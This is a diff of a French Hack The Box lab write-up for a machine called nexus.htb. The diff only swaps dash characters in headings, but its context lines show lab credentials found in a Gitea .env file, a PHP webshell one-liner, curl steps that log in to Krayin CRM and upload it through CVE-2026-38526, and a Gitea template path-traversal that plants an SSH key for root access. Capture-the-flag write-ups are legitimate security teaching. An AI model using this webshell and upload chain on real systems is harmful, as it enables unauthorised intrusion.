@@ -67,7 +67,7 @@ Mais contrairement à Flowise, le token n'est **pas retourné dans la réponse A
 
 ---
 
-## Étape 4 — Découverte de credentials dans l'historique Gitea
+## Étape 4 -- Découverte de credentials dans l'historique Gitea
 
 On explore Gitea sans s'authentifier. L'énumération de répertoires sur `git.nexus.htb` révèle deux profils publics : **admin** et **jones**. Le profil `jones` contient un dépôt avec plusieurs fichiers dont un `.env`.
 
@@ -88,7 +88,7 @@ j.matthew@nexus.htb : N27xh!!2ucY04
 
 ---
 
-## Étape 5 — CVE-2026-38526 : RCE via upload sur Krayin
+## Étape 5 -- CVE-2026-38526 : RCE via upload sur Krayin
 
 En cherchant des vulnérabilités sur Krayin CRM 2.2.0, on trouve la **CVE-2026-38526** : l'endpoint `/admin/tinymce/upload`, destiné à l'upload d'images pour l'éditeur de texte riche TinyMCE, n'effectue aucune vérification sur le type réel du fichier uploadé. En envoyant un fichier `.php` avec le Content-Type `image/jpeg`, le serveur l'accepte et le place dans un répertoire web-accessible, permettant une exécution de code côté serveur.
 
@@ -104,7 +104,7 @@ EMAIL="j.matthew@nexus.htb"
 PASSWORD="N27xh!!2ucY04"
 ```
 
-**1 — Création du webshell**
+**1 - Création du webshell**
 
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
@@ -112,7 +112,7 @@ echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
 
 Un webshell PHP minimal : quand on visite le fichier avec `?cmd=<commande>`, PHP exécute la commande et affiche le résultat.
 
-**2 — Récupération du token CSRF**
+**2 - Récupération du token CSRF**
 
 ```bash
 curl -s -c /tmp/jar.txt "$TARGET/admin/login" -o /tmp/login.html
@@ -121,7 +121,7 @@ CSRF=$(grep -o 'name="_token" value="[^"]*"' /tmp/login.html | cut -d'"' -f4)
 
 Krayin (comme toutes les applications Laravel) protège ses formulaires POST par un token CSRF, un identifiant unique généré côté serveur et inclus dans le HTML de la page. Sans lui, le serveur rejette la soumission. On récupère la page de login avec `-c /tmp/jar.txt` (qui sauvegarde les cookies), puis on extrait la valeur du token depuis le HTML avec `grep`.
 
-**3 — Authentification**
+**3 - Authentification**
 
 ```bash
 curl -s -c /tmp/jar.txt -b /tmp/jar.txt \
@@ -136,7 +136,7 @@ curl -s -c /tmp/jar.txt -b /tmp/jar.txt \
 
 On soumet le formulaire de login avec le token CSRF, les credentials, et les cookies déjà obtenus. L'option `-c`/`-b` lit et réécrit le fichier de cookies à chaque requête, ce qui permet de maintenir la session entre les appels curl.
 
-**4 — Extraction du XSRF-TOKEN**
+**4 - Extraction du XSRF-TOKEN**
 
 ```bash
 XSRF=$(grep XSRF /tmp/jar.txt | awk '{print $NF}' | python3 -c \
@@ -145,7 +145,7 @@ XSRF=$(grep XSRF /tmp/jar.txt | awk '{print $NF}' | python3 -c \
 
 Laravel utilise deux mécanismes de protection CSRF en parallèle : le `_token` dans les formulaires HTML, et un cookie `XSRF-TOKEN` pour les requêtes AJAX et API. Ce cookie est encodé en URL (les `%3D`, `%2B`, etc.), d'où le décodage via `urllib.parse.unquote`. C'est cette valeur qu'il faut envoyer dans le header `X-XSRF-TOKEN` pour que Krayin accepte la requête d'upload.
 
-**5 — Upload du webshell**
+**5 - Upload du webshell**
 
 ```bash
 RESPONSE=$(curl -s -b /tmp/jar.txt \
@@ -393,7 +393,7 @@ Ce qui, joint à `stage_path` (`/home/git/template-staging/jones/repo`), donnera
 
 ## Étape 10 -- Mise en œuvre de l'exploit
 
-**1 — Génération de la clé SSH**
+**1 - Génération de la clé SSH**
 
 ```bash
 ssh-keygen -t ed25519 -f /tmp/ma_cle -N ""
@@ -406,11 +406,11 @@ On copie la clé privée sur notre machine attaquante dans `/tmp/ma_cle` et on l
 chmod 600 /tmp/ma_cle
 ```
 
-**2 — Création du dépôt template dans Gitea**
+**2 - Création du dépôt template dans Gitea**
 
 On se connecte à l'interface web Gitea avec `jones:y27xb3ha!!74GbR`, on crée un dépôt nommé `Repo` en cochant **"Template repository"**.
 
-**3 — Clonage et exécution du script**
+**3 - Clonage et exécution du script**
 
 Depuis la machine cible en tant que `jones` :
 
@@ -431,7 +431,7 @@ python3 /tmp/exploit.py
 Done: 3a7f1c2d...
 ```
 
-**4 — Push du repo forgé**
+**4 - Push du repo forgé**
 
 ```bash
 git push -u origin main --force
@@ -446,7 +446,7 @@ Writing objects: 100% (11/11), 613 bytes | 306.00 KiB/s, done.
 
 Les warnings `Permission denied` sur `.gitattributes` confirment que Git a bien tenté de remonter dans `/root/`, le path traversal fonctionne. On attend que le timer s'exécute (au plus une minute).
 
-**5 — Connexion SSH en root**
+**5 - Connexion SSH en root**
 
 ```bash
 ssh -i /tmp/ma_cle root@nexus.htb
